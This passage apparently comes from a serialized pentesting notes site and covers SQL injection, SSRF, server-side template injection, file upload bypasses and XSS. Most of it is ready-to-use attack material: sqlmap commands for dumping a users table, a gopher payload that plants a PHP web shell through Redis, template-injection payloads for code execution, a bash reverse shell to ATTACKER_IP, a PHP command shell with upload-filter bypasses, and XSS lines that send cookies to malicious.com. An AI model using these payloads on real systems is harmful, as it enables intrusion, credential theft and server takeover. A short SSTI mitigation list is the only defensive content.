result\nsqlmap -r blind.txt -p search --batch --dbs  -threads 10\n \n# Skip sys dbs for faster enumeration \nsqlmap -r blind.txt -p search --batch --dbs  -threads 10 --exclude-sysdb\n \n# Get tables\nsqlmap -r blind.txt -D target_db --tables\n \n# Get columns\nsqlmap -r blind.txt -D target_db -T users --columns\n \n# Dump data\nsqlmap -r blind.txt -D target_db -T users -C username,password --dump"},"WEB-Exploitation/SQLi/SQL-UNION-Injection":{"slug":"WEB-Exploitation/SQLi/SQL-UNION-Injection","filePath":"WEB Exploitation/SQLi/SQL UNION Injection.md","title":"SQL UNION Injection","links":[],"tags":[],"content":"Requisite\n\nBoth of the queries (original and injected) return same no. of columns and same data type\n\nIdentify the no. of columns\nFor a successful union injection we need to know he no. of columns original query returns. We can do that by injecting order by query until we get an error.\ne.g. Lets say we get following results:\n&#039; UNION ORDER BY 1-- → 200 OK\n&#039; UNION ORDER BY 2-- → 200 OK\n&#039; UNION ORDER BY 3-- → 500 Internal Server Error\nWe can now conclude that the original query returns 2 columns.\nWe can also try to select columns to learn the no. of columns: &#039; UNION SELECT NULL, NULL--\nIdentify the column data type\nWe may need a column to return string value, so to check if a column supports string/char value we can just try selecting chars as follows: &#039; UNION SELECT &#039;a, NULL-- . If we get 200 OK Response then we know that the first columns support character data. We can repeat it for other columns as well.\nPayload\nAfter we know the no. of column and data type of the columns. we can now inject our payload and retrieve data as follows:\n&#039; UNION SELECT @@version, NULL--\nHere, we identified the original query had 2 columns so we also have 2 columns in our payload and both of the columns supported string so we passed our data to first one and passed NULL to the extra column."},"WEB-Exploitation/SSRF":{"slug":"WEB-Exploitation/SSRF","filePath":"WEB Exploitation/SSRF.md","title":"SSRF","links":[],"tags":[],"content":"Server-Side Request Forgery (SSRF)\nIntroduction\nServer-Side Request Forgery (SSRF) is a web security vulnerability that allows an attacker to induce a server-side application to make HTTP requests to an unintended location. Fundamentally, it occurs when the application server fetches data from a URL or resource that a user can control and fails to properly validate this input.\nAn attacker can use this vulnerability to make the server send requests to internal network resources that it should not normally have access to (such as databases, administrative panels, other servers), or to the server’s own local file system (localhost).\nsequenceDiagram\n    participant Attacker\n    participant Vulnerable Server\n    participant Internal Service\n    participant External Service\n\n    Attacker-&gt;&gt;Vulnerable Server: Submits malicious URL (e.g., http://internal-service/admin)\n    Vulnerable Server--&gt;&gt;Internal Service: Makes request to internal URL\n    Internal Service--&gt;&gt;Vulnerable Server: Returns response (e.g., admin panel)\n    Vulnerable Server--&gt;&gt;Attacker: Forwards response to attacker\n\n    Attacker-&gt;&gt;Vulnerable Server: Submits URL to external site\n    Vulnerable Server--&gt;&gt;External Service: Proxies request\n    External Service--&gt;&gt;Vulnerable Server: Returns response\n    Vulnerable Server--&gt;&gt;Attacker: Forwards response\n\n\nWhy is it Important?\nSSRF vulnerabilities are extremely dangerous because they can bypass firewalls, VPNs, and other network segmentation controls by using the server as a proxy. This can grant attackers capabilities such as:\n\nInternal Network Scanning: Attackers can map the internal network topology by scanning for other machines and open ports.\nAccess to Sensitive Data: Using protocols like file:///, it is possible to access the server’s local files (e.g., /etc/passwd, configuration files). Additionally, in cloud environments (AWS, Azure, Google Cloud), it’s possible to access the metadata services of servers (e.g., http://169.254.169.254/) to steal temporary credentials like access keys and tokens.\nAttacking Other Systems: They can exploit other vulnerable services on the internal network (e.g., administrative interfaces, databases) by sending requests to them.\nRemote Code Execution (RCE): In some cases, it may be possible to achieve remote code execution on the server by sending specially crafted payloads to certain internal services like Redis.\n\nFor these reasons, SSRF is a critical vulnerability listed in the OWASP Top 10 and must be taken seriously.\ngraph TD\n    A[Attacker] --&gt; B{Vulnerable Server};\n    B --&gt; C[Firewall Bypass];\n    C --&gt; D[Internal Network];\n    D --&gt; E[Database];\n    D --&gt; F[Admin Panel];\n    D --&gt; G[Other Internal Servers];\n    B --&gt; H[Cloud Metadata Service &lt;br&gt; 169.254.169.254];\n    H --&gt; I[Cloud Credentials];\n    B --&gt; J[Local Filesystem &lt;br&gt; file:///etc/passwd];\n\n\nWhere is SSRF Found?\nSSRF vulnerabilities can arise in any feature that requires the server to make a server-side request to a URL provided by a user. Common areas include:\n1. Importing Data from a URL\nWeb applications often allow users to import data via a URL, such as fetching a profile picture or product information.\n\nExample Scenario: A feature lets a user upload their avatar from a URL.\nVulnerable Parameter: avatar_url=example.com/avatar.jpg\nAttack Vector: An attacker could change this parameter to an internal address like avatar_url=http://127.0.0.1/admin to access the server’s local admin panel.\n\n2. Webhooks\nWebhooks send automated notifications to user-configurable URLs. If not validated, these URLs can be pointed to internal services.\n\nExample Scenario: An e-commerce site notifies an inventory system via a webhook when an order is placed.\nUser-Configured URL: inventory-system.api/notify\nAttack Vector: A malicious user could change the webhook URL to an address like http://localhost:8080/sensitive-info to send unauthorized requests.\n\n3. Document and Report Generators\nServices that generate PDFs or other documents from web content must fetch the content of the user-provided URL.\n\nExample Scenario: An online tool that converts a web page to a PDF.\nVulnerable Parameter: url_to_convert=my-blog-post.com\nAttack Vector: An attacker might read and embed local server files into the PDF by changing the parameter to url_to_convert=file:///etc/hosts.\n\n4. Backend API Calls\nIn microservice architectures, a client-supplied parameter might determine which internal service to contact.\n\nExample Scenario: An API checks product stock by making a request to a specific store’s internal API.\nRequest Body: { &quot;productId&quot;: &quot;12345&quot;, &quot;storeApi&quot;: &quot;stock-api-london.internal/&quot; }\nAttack Vector: An attacker could attempt to steal credentials by changing the storeApi value to a sensitive address like metadata.internal/latest/credentials.\n\n\nDetecting and Exploiting SSRF\nStep 1: Identifying the Vulnerable Input Point\nFirst, find a parameter that accepts a URL or IP address. Common parameter names include url, uri, path, import, image_url, etc.\nNormal Request:\nGET /loadImage?image_url=external-site.com/image.png HTTP/1.1\nHost: vulnerable-site.com\nUser-Agent: Mozilla/5.0\nNormal Response:\nHTTP/1.1 200 OK\nContent-Type: image/png\nContent-Length: 15234\n \n[PNG image data...]\nStep 2: Basic SSRF Test (Accessing localhost)\nThe simplest test is to make the server request a resource from itself using localhost or 127.0.0.1.\nRequest with Payload:\nGET /loadImage?image_url=http://127.0.0.1/ HTTP/1.1\nHost: vulnerable-site.com\nPossible Responses and Analysis:\n\nSuccessful Response: The server returns HTML content, such as an Apache “It works!” page or an admin login, which confirms the vulnerability.\n\nHTTP/1.1 200 OK\nContent-Type: text/html\n \n&lt;html&gt;&lt;body&gt;&lt;h1&gt;It works!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;\n\nError Message: Errors like “Connection refused” or “Invalid file format” are also strong indicators. They suggest the server attempted the connection but failed, which is different from how it would handle a request to a valid external resource.\n\nStep 3: Scanning the Internal Network and Ports\nOnce confirmed, an attacker can probe the internal network for other live hosts and open ports.\nRequest with Payload (Port Scanning):\nGET /loadImage?image_url=http://192.168.1.1:8080 HTTP/1.1\nHost: vulnerable-site.com\nResponse Analysis:\n\nOpen Port: The response may contain HTML from a web service or simply be different in size or timing compared to a closed port.\nClosed Port: A “Connection refused” error is typical.\nFiltered Port: The request will likely time out.\n\nStep 4: Using Different URL Schemes\nSSRF is not limited to http://. Other schemes can be used depending on the server’s configuration.\n\n\nReading Local Files with file:///:\n\n\nPayload: file:///etc/passwd\n\n\nRequest: GET /loadImage?image_url=file:///etc/passwd\n\n\nResponse: The server may return the contents of the /etc/passwd file.\n\n\nSending Complex Requests with gopher://:\nThe gopher:// scheme can send raw TCP data, making it extremely powerful for interacting with services like Redis or SMTP.\n\n\nExample (Sending Commands to Redis): This payload sends a SET command to a Redis server on port 6379.\n\n\nPayload: gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$3%0d%0akey%0d%0a$5%0d%0avalue%0d%0a\n\n\nExplanation: This URL-encoded payload uses the Redis Serialization Protocol (RESP) to execute SET key value. The gopher:// request sends these raw bytes directly to the Redis port. Gopher requests are often blind, meaning a direct response isn’t returned.\n\n\nStep 5: SSRF in Cloud Environments\nIf the application is on a cloud platform (AWS, GCP, Azure), SSRF can be used to access the internal metadata service.\nPayload (AWS Metadata Service):\nThe AWS metadata service is located at the static IP 169.254.169.254.\nRequest:\nGET /loadImage?image_url=http://169.254.169.245/latest/meta-data/iam/security-credentials/admin-role HTTP/1.1\nHost: vulnerable-site.com\nResponse:\nThe server may return temporary AWS credentials, allowing the attacker to access the cloud account.\nHTTP/1.1 200 OK\nContent-Type: application/json\n \n{\n  &quot;Code&quot; : &quot;Success&quot;,\n  &quot;AccessKeyId&quot; : &quot;ASIA...&quot;,\n  &quot;SecretAccessKey&quot; : &quot;...&quot;,\n  &quot;Token&quot; : &quot;...&quot;,\n  &quot;Expiration&quot; : &quot;2024-08-08T18:00:00Z&quot;\n}\n\nEscalating from SSRF to RCE\nSSRF can be escalated to Remote Code Execution (RCE) by forcing the server to interact with an internal service that can execute commands, such as an unprotected Redis instance.\nScenario: Abusing Redis for RCE\nIf an attacker can reach an internal Redis server (default port 6379) that requires no authentication, they can send commands to write a web shell to a web-accessible directory.\nStep-by-Step Exploitation\nThe attacker crafts a Gopher payload to send a sequence of Redis commands:\n\nFLUSHALL: Clear the database.\nSET shell &quot;&lt;?php system($_GET[&#039;cmd&#039;]); ?&gt;&quot;: Store a PHP web shell in a key.\nCONFIG SET dir /var/www/html/: Set Redis’s working directory to the web root.\nCONFIG SET dbfilename shell.php: Set the backup filename to shell.php.\nSAVE: Write the current data (including the web shell) to shell.php.\n\nThe Gopher Payload\nThe commands must be formatted using the RESP protocol and then URL-encoded.\nURL-Encoded Gopher Payload:\ngopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%245%0D%0Ashell%0D%0A%2433%0D%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0ASAVE%0D%0A\n\nWhen this payload is injected into a vulnerable parameter, the server connects to Redis and executes the commands.\nResult:\nIf successful, a file is created at vulnerable-site.com/shell.php. The attacker can then execute commands via URL parameters, like vulnerable-site.com/shell.php\n\nTools and Resources\nAutomated Scanning Tools\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nToolDescriptionLicenseLinkBurp Suite ProfessionalAn advanced web application scanner. Its “Collaborator Client” feature is highly effective at detecting blind SSRF.Commercialportswigger.net/burpSSRFmapAn open-source Python tool specifically for detecting and exploiting SSRF vulnerabilities.Open Sourcegithub.com/swisskyrepo/SSRFmapNucleiA fast, template-based scanner with a large library of community templates for SSRF detection.Open Sourcenuclei.projectdiscovery.io/Acunetix / InvictiCommercial DAST tools that offer comprehensive automated scans, including SSRF detection.Commercialwww.acunetix.com/\nPayload Lists and Resources\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nResourceDescriptionLinkPayloadsAllTheThingsA massive GitHub repository with payloads and bypass techniques for a wide range of vulnerabilities, including a comprehensive SSRF section.https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgerypayloadbox/ssrf-payload-listA curated list of various payloads specifically crafted for SSRF testing.https://github.com/payloadbox/ssrf-payload-list"},"WEB-Exploitation/SSTI":{"slug":"WEB-Exploitation/SSTI","filePath":"WEB Exploitation/SSTI.md","title":"SSTI","links":[],"tags":[],"content":"Introduction\n\nWhat is Server-Side Template Injection (SSTI)?\nServer-Side Template Injection (SSTI) is a web security vulnerability that occurs when an attacker can inject malicious code into a template engine used on the server side. Developers often use template engines to generate dynamic web pages. These engines combine a static template file (such as HTML, email, etc.) with dynamic data to produce the final content displayed to the end-user.\n\nIf data from the user (like URL parameters, form inputs, etc.) is sent directly to the template engine without proper sanitization, attackers can exploit this situation. By using the template engine’s own syntax, they can execute unexpected commands on the server, access sensitive files, and even gain full control of the server. This makes SSTI a very critical and dangerous type of vulnerability.\n\nWhat is a Template Engine?\nA Template Engine is a common tool in software development. Its primary purpose is to combine data and a template to generate dynamic content. The template usually has a static structure, like HTML, and contains special tags or expressions (placeholders/variables) that specify where the dynamic data should be placed.\nWe can compare it to a letter template:\nHello {{username}},\n \nYour order ({{order_no}}) has been successfully created.\nIn this template, {{username}} and {{order_no}} are fields to be filled dynamically. The template engine takes this template and the actual data (e.g., “Alice” and “12345”) to produce an output like this:\nHello Alice,\n \nYour order (12345) has been successfully created.\nPopular template engines include Jinja2 and Mako (Python); Twig and Smarty (PHP); and Freemarker and Velocity (Java).\n\nImportant: Template engines do not only substitute variables — many support loops, conditionals, filters, and function calls. SSTI abuses those features.\n\n\nImpact of SSTI Attacks\nThe impact of an SSTI vulnerability can vary depending on the template engine used and the application’s configuration, but it is generally quite severe. Potential impacts include:\n\n\nRemote Code Execution (RCE): attacker runs arbitrary commands → full server control.\n\n\nSensitive Data Disclosure: read files like /etc/passwd, DB connection strings, API keys, app source.\n\n\nServer-Side Request Forgery (SSRF): use server as proxy to internal services.\n\n\nDenial of Service (DoS): infinite loops or resource exhaustion in templates.\n\n\n\nDetection and Identification of the Vulnerability\nDetecting an SSTI vulnerability requires a systematic approach. Start by injecting a simple mathematical operation payload and see if the server evaluates it. If the expression is evaluated and the result appears in the response, that’s strong evidence of SSTI.\nStep 1: Detecting the Vulnerability\nSend payloads containing the template syntax characters ($, {, }, %, &lt;, &gt;) and observe the response.\nExample — normal parameter\nRequest:\nGET /profile?name=Jules HTTP/1.1\nHost: vulnerable-site.com\n...\n\nResponse:\nHTTP/1.1 200 OK\n...\n&lt;h1&gt;Welcome, Jules!&lt;/h1&gt;\nExample — payload injection (Jinja2 syntax {{ ... }})\nRequest:\nGET /profile?name={{7*7}} HTTP/1.1\nHost: vulnerable-site.com\n...\n\nThree possible responses:\n\nResponse 1: No Vulnerability — app treats input as plain text:\n\n&lt;h1&gt;Welcome, {{7*7}}!&lt;/h1&gt;\n\nResponse 2: Input Sanitized — app encodes/removes dangerous chars:\n\n&lt;h1&gt;Welcome, 7*7!&lt;/h1&gt;\n&lt;!-- or --&gt;\n&lt;h1&gt;Welcome, &amp;lcub;&amp;lcub;7*7&amp;rcub;&amp;rcub;!&lt;/h1&gt;\n\nResponse 3: Vulnerability Confirmed — template engine evaluated it and returned 49:\n\n&lt;h1&gt;Welcome, 49!&lt;/h1&gt;\nIf you see 49 you can safely conclude SSTI exists.\n\nStep 2: Identifying the Template Engine\nAfter detection, identify the engine — payloads behave differently across engines. Use specialised payloads and observe outputs.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPayloadExpected ResultPotential Engine(s){{7*&#039;7&#039;}}49Twig{{7*&#039;7&#039;}}7777777Jinja2{{&#039;a&#039;.toUpperCase()}}AJinja2, Mako, Twig, Nunjucks${7*7}49Freemarker&lt;#assign x=&quot;7*7&quot;&gt;${x}49Freemarker@{7*7}49Razor (.NET)@(7*7)49Razor (.NET)#{7*7}49Java (JSF)*{{7*7}}**49*Handlebars{{ this.getClass() }}Java object nameJava (General)&lt;%= 7 * 7 %&gt;49Ruby (ERB)\nExample: Identifying Jinja2\nSend:\nGET /profile?name={{7*&#039;7&#039;}} HTTP/1.1\n\nIf the server returns 7777777 that indicates Jinja2 (string * int multiplication → repetition). Twig would error out for that payload.\n\nWhere to Look for SSTI Vulnerabilities\nSSTI can appear anywhere user input is included in a server-side template:\n\n\nURL parameters (?param=value)\n\n\nPOST data (forms: username, comment, search)\n\n\nHTTP headers (User-Agent, Referer, X-Forwarded-For)\n\n\nCookies (e.g., welcome_message)\n\n\nFile uploads (uploaded file names placed in template responses)\n\n\nEmail templates (marketing/notification systems allowing template editing)\n\n\nCMS and Wiki pages (user-editable content, macros)\n\n\n\nVulnerability Exploitation\nAfter detection + identification, exploitation begins: from reading sensitive files to RCE. Below are common steps and payloads.\n1. Inspecting Context Variables\nDump the template context to see accessible objects/variables.\nJinja2/Twig example:\nRequest:\nGET /profile?name={{self}} HTTP/1.1\nHost: vulnerable-site.com\n...\n\nResponse may show objects like:\n&lt;TemplateReference {&#039;config&#039;: &lt;Config {&#039;SECRET_KEY&#039;: &#039;s3cr3t_valu3&#039;, &#039;DATABASE_URI&#039;: &#039;...&#039;} &gt;, &#039;request&#039;: &lt;Request &#039;vulnerable-site.com/profile#039;&gt;, ...} &gt;\n\nThis reveals config with sensitive fields.\n2. Accessing Sensitive Information\nIf config is present:\nRequest:\nGET /profile?name={{config.SECRET_KEY}} HTTP/1.1\nHost: vulnerable-site.com\n...\n\nResponse:\n&lt;h1&gt;Welcome, s3cr3t_valu3!&lt;/h1&gt;\nLeaking API keys, DB passwords, salts, etc.\n3. Calling Object Methods\nTemplates may allow calling methods:\nRequest:\nGET /profile?name={{user.getPassword()}} HTTP/1.1\n\nResponse might contain password or hash.\n4. Escaping the Sandbox and Reading Files\nGoal: climb object model to reach __builtins__ and call dangerous functions, e.g., open.\nJinja2 file read payload:\n{{ self.__init__.__globals__[&#039;__builtins__&#039;][&#039;open&#039;](&#039;/etc/passwd&#039;).read() }}\nRequest:\nGET /profile?name={{ self.__init__.__globals__[&#039;__builtins__&#039;][&#039;open&#039;](&#039;/etc/passwd&#039;).read() }} HTTP/1.1\n\nResponse:\n&lt;h1&gt;Welcome, root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n...&lt;/h1&gt;\nThis proves arbitrary file read ability.\n\nEscalating to Remote Code Execution (RCE)\nIf you can reach builtins like __import__ or eval, you can load modules that execute commands.\nRCE in Python (Jinja2)\nPayload:\n{{ self.__init__.__globals__[&#039;__builtins__&#039;][&#039;__import__&#039;](&#039;os&#039;).popen(&#039;id&#039;).read() }}\nThis imports os then runs id via popen() and reads the output.\nResponse example:\n&lt;h1&gt;Welcome, uid=33(www-data) gid=33(www-data) groups=33(www-data)!&lt;/h1&gt;\nAfter this, any shell command is possible — ls -la, cat /etc/shadow, spawn reverse shells, etc.\nPHP (Twig) Environment RCE\nTwig is usually safer, but misconfigurations happen.\nIf system/exec are accessible as filters:\nPayload:\n{{ [&#039;id&#039;]|filter(&#039;system&#039;) }}\nResponse:\n&lt;h1&gt;Welcome, uid=33(www-data) gid=33(www-data) groups=33(www-data)!&lt;/h1&gt;\nTwo-step: define undefined filter callback → call undefined filter.\n\nRegister:\n\n{{ _self.env.registerUndefinedFilterCallback(&quot;exec&quot;) }}\n\nCall:\n\n{{ _self.env.getFilter(&quot;id&quot;) }}\nIf passthru already exists:\n{{ &quot;ls -la&quot;|passthru }}\nResult: command output printed.\nAchieving RCE in Twig depends heavily on environment config; it’s harder than Jinja2 but still possible with misconfigurations.\n\nRCE Examples in Other Template Engines\n\nJava (Freemarker)\nPayload:\n\n&lt;#assign ex = &quot;freemarker.template.utility.Execute&quot;?new()&gt;${ ex(&quot;id&quot;) }\nCreates Execute utility and runs id.\n\n.NET (Razor)\nPayload:\n\n@{ System.Diagnostics.Process.Start(&quot;cmd.exe&quot;,&quot;/c whoami&quot;); }\nUses Process.Start() to execute commands.\n\nNodeJS (Pug/Jade)\nPayload:\n\n#{root.process.mainModule.require(&#039;child_process&#039;).spawnSync(&#039;cat&#039;, [&#039;/etc/passwd&#039;]).stdout}\nLoads child_process and runs cat /etc/passwd.\n\nObtaining a Reverse Shell\nAfter RCE, attacker often attempts a reverse shell.\nAttacker listener:\nnc -lvp 4444\nBash reverse shell payload (embed into template RCE):\nbash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1\nExample (Twig filter-based):\n{{ [&#039;bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1&#039;]|filter(&#039;system&#039;) }}\nWhen executed, server connects back to attacker listener → interactive shell.\n\nTools and Resources\nAutomated tools speed detection/exploitation but manual understanding is invaluable.\nAutomated Tools\nTplmap\n\n\nOpen-source SSTI detection/exploitation tool (like sqlmap for SSTI).\n\n\nGithub: epinna/tplmap\n\n\nExample:\npython tplmap.py -u &quot;vulnerable-site.com/profile --os-shell\nBurp Suite\n\n\nIndustry standard. Active scan may find obvious SSTI. Repeater/Intruder help manual tests.\n\n\nExtensions: BApp Store has SSTI helpers (e.g., “SSTI Scanner”).\n\n\nPayload Resources and References\n\n\nPayloadAllTheThings — large collection of payloads including SSTI: PayloadsAllTheThings/tree/master/Server Side Template Injection\n\n\nPayloadBox SSTI Payloads — SSTI payload collections.\n\n\n\nMitigations\n\n\nKeep template and data separate — do not createTemplate/render_template_string with user input as template.\n\n\nUse framework template rendering with context variables that are escaped by default.\n\n\nSanitize and validate user input; whitelist acceptable patterns/characters where possible.\n\n\nDisable/limit render features, remove risky filters and functions from template environments.\n\n\nRun web app with least privileges (so if exploited, impact is reduced).\n\n\nUse runtime protections (WAF), but don’t rely solely on them.\n\n\nApply secure coding review &amp; automated testing for template usage.\n\n"},"WEB-Exploitation/Unrestricted-File-Upload":{"slug":"WEB-Exploitation/Unrestricted-File-Upload","filePath":"WEB Exploitation/Unrestricted File Upload.md","title":"Unrestricted File Upload","links":[],"tags":[],"content":"File Upload Bypass Techniques\nMany web applications implement file upload restrictions to prevent malicious file uploads. However, these protections can often be bypassed using different techniques.\n\n1. MIME Type Bypass\nBy changing the MIME type to image/png, the upload might succeed:\n\nContent-Type: image/png\n\n\nIf the server only checks the MIME type, it may treat the file as an image and allow upload.\n\n2. File Signature (Magic Header) Bypass\nFile signatures (magic headers) are sequences of bytes identifying file content. Applications sometimes validate file types using these headers.\nMalicious File (cmd.php)\n&lt;?php\n    if (isset($_GET[&#039;cmd&#039;])) {\n        system($_GET[&#039;cmd&#039;]);\n    }\n?&gt;\nTo bypass signature checks, prepend the GIF magic header (GIF89a;):\nGIF89a;\n&lt;?php\n    if (isset($_GET[&#039;cmd&#039;])) {\n        system($_GET[&#039;cmd&#039;]);\n    }\n?&gt;\nIf the server checks for GIF89a, it may believe the file is an image and accept it.\n\n3. File Extension Bypass\nSome systems block certain file extensions. Alternative executable extensions can bypass blacklist filters.\nCommon Extensions\n\nPHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .pht, .phtm, .phtml, .phar\nASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml\nJSP: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action\n\n\n4. Using .htaccess\nThe .htaccess file can redefine how certain extensions are handled.\nExample:\n\nUpload a malicious file with a non-standard extension (e.g., cmd.bypass):\n\n&lt;?php\n    if (isset($_GET[&#039;cmd&#039;])) {\n        system($_GET[&#039;cmd&#039;]);\n    }\n?&gt;\n\nUpload .htaccess with the following content:\n\nAddType application/x-httpd-php .bypass\n\nNow, files with .bypass extension are executed as PHP.\n\n5. Null Byte Injection\nAppending a null byte (%00) before a safe extension can bypass filters:\ncmd.php%00.jpg\n\nThe server may ignore everything after %00 and treat it as .php.\n\n6. Case Sensitivity Tricks\nSome systems treat uppercase/lowercase differently. Example:\nCMD.PHP\n\nThis may bypass case-sensitive extension filters."},"WEB-Exploitation/XSS/Common-XSS-Payload-List":{"slug":"WEB-Exploitation/XSS/Common-XSS-Payload-List","filePath":"WEB Exploitation/XSS/Common XSS Payload List.md","title":"Common XSS Payload List","links":[],"tags":[],"content":"Basic Payloads\n\nDisplays a simple alert box\n\n&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;\n\nShows the user’s cookie information\n\n&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n\nDisplays the domain information\n\n&lt;script&gt;alert(document.domain)&lt;/script&gt;\n\nExecutes alert due to failed image load\n\n&lt;img src=&quot;x&quot; onerror=&quot;alert(&#039;XSS&#039;)&quot;&gt;\n\nExecutes alert when SVG loads\n\n&lt;svg/onload=alert(&#039;XSS&#039;)&gt;\n\nInjection Variants\n\nInjects script into broken HTML\n\n&quot;&gt;&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;\n\nRuns on body load\n\n&lt;body onload=alert(&#039;XSS&#039;)&gt;\n\nExecutes JS in iframe\n\n&lt;iframe src=&quot;javascript:alert(&#039;XSS&#039;)&quot;&gt;\n\nInjects inside input value\n\n&lt;input type=&quot;text&quot; value=&quot;&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;&quot;&gt;\n\nDirect link execution\n\njavascript:alert(&#039;XSS&#039;)\n\nTriggers on mouse hover\n\nonmouseover=&quot;alert(&#039;XSS&#039;)&quot;\n\nRuns malicious JS in iframe\n\n&quot;&gt;&lt;iframe src=&quot;javascript:alert(&#039;XSS&#039;)&quot;&gt;&lt;/iframe&gt;\n\nLoads and executes external JS\n\n&lt;script src=&quot;example.com/malicious-code.js&quot;&gt;&lt;/script&gt;\n\nExecutes via image element\n\n&quot;&gt;&lt;img src=&quot;javascript:alert(&#039;XSS&#039;)&quot;&gt;\n\nExecutes via CSS background\n\n&lt;div style=&quot;background:url(&#039;javascript:alert(&#039;XSS&#039;)&#039;)&quot;&gt;&lt;/div&gt;\n\nWrites and executes script\n\n&lt;script&gt;document.write(&#039;&lt;img src=&quot;x&quot; onerror=&quot;alert(&#039;XSS&#039;)&quot;&gt;&#039;)&lt;/script&gt;\n\nExecutes on link click\n\n&lt;a href=&quot;javascript:alert(&#039;XSS&#039;)&quot;&gt;Click me!&lt;/a&gt;\n\nExecutes via embed\n\n&lt;embed src=&quot;javascript:alert(&#039;XSS&#039;)&quot;&gt;\n\nExecutes via object\n\n&lt;object data=&quot;javascript:alert(&#039;XSS&#039;)&quot;&gt;\n\nExecutes inside style import\n\n&lt;style&gt;@import &#039;javascript:alert(&quot;XSS&quot;)&#039;;&lt;/style&gt;\n\nExecutes inside broken style import\n\n&quot;&gt;&lt;style&gt;@import &#039;javascript:alert(&quot;XSS&quot;)&#039;;&lt;/style&gt;\n\nData Exfiltration\n\nSteals cookies via fetch\n\n&lt;script&gt;fetch(&quot;malicious.com/+document.cookie)&lt;/script&gt;\n\nSteals cookies via redirect\n\n&lt;script&gt;document.location=&#039;malicious.com/#039; + document.cookie;&lt;/script&gt;\n\nSteals domain via image\n\n&lt;script&gt;new Image().src=&#039;malicious.com/#039; + document.domain;&lt;/script&gt;\n\nSteals HTML via image\n\n&lt;script&gt;new Image().src=&#039;malicious.com/#039; + encodeURIComponent(document.body.innerHTML);&lt;/script&gt;\n\nSends cookies+URL via fetch\n\n&lt;script&gt;fetch(&#039;malicious.com&#039;, { method: &#039;POST&#039;, body: JSON.stringify({cookie: document.cookie, location: document.location}) });&lt;/script&gt;\n\nDeletes cookies\n\n&lt;script&gt;document.cookie=&#039;username=; expires=Thu, 01 Jan 1970 00:00:01 GMT;&#039;;&lt;/script&gt;\n\nChanges document domain\n\n&lt;script&gt;document.domain=&#039;malicious.com&#039;;&lt;/script&gt;\n\nSteals cookies via location\n\n&quot;&gt;&lt;script&gt;document.location=&#039;malicious.com#039; + document.cookie;&lt;/script&gt;\n\nDisplays cookies via location\n\n&quot;&gt;&lt;script&gt;document.location=&#039;javascript:alert(document.cookie)&#039;;&lt;/script&gt;\n\nDisplays domain via location\n\n&quot;&gt;&lt;script&gt;document.location=&#039;javascript:alert(document.domain)&#039;;&lt;/script&gt;\n\nSends cookies via AJAX\n\n&lt;script&gt;xhr=new XMLHttpRequest();xhr.open(&#039;GET&#039;,&#039;malicious.com#039;+document.cookie,true);xhr.send();&lt;/script&gt;\n\nSends domain via AJAX\n\n&lt;script&gt;xhr=new XMLHttpRequest();xhr.open(&#039;GET&#039;,&#039;malicious.com#039;+document.domain,true);xhr.send();&lt;/script&gt;\n\nSteals cookies via image element\n\n&lt;script&gt;var img=document.createElement(&#039;img&#039;);img.src=&#039;malicious.com#039;+document.cookie;document.body.appendChild(img);&lt;/script&gt;\n\nSteals domain via image element\n\n&lt;script&gt;var img=document.createElement(&#039;img&#039;);img.src=&#039;malicious.com#039;+document.domain;document.body.appendChild(img);&lt;/script&gt;\n\nSteals cookies via iframe\n\n&lt;script&gt;document.write(&#039;&lt;iframe src=&quot;malicious.com#039; + document.cookie + &#039;&quot;&gt;&lt;/iframe&gt;&#039;);&lt;/script&gt;\n\nSteals domain via iframe\n\n&lt;script&gt;document.write(&#039;&lt;iframe src=&quot;malicious.com#039; + document.domain + &#039;&quot;&gt;&lt;/iframe&gt;&#039;);&lt;/script&gt;\n\nSaves cookies to localStorage\n\n&lt;script&gt;localStorage.setItem(&#039;data&#039;, document.cookie);&lt;/script&gt;\n\nSaves domain to sessionStorage\n\n&lt;script&gt;sessionStorage.setItem(&#039;data&#039;, document.domain);&lt;/script&gt;\n\nRedirection Payloads\n\nRedirects to referrer\n\n&lt;script&gt;top.location=document.referrer;&lt;/script&gt;\n\nRedirects opener window\n\n&lt;script&gt;window.opener.location=&#039;malicious.com&#039;;&lt;/script&gt;\n\nRedirects parent frame\n\n&lt;script&gt;window.parent.location=&#039;malicious.com&#039;;&lt;/script&gt;\n\nPre-made Payload Lists\n\ngithub.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection\ngithub.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS\ngithub.com/payloadbox/xss-payload-list - 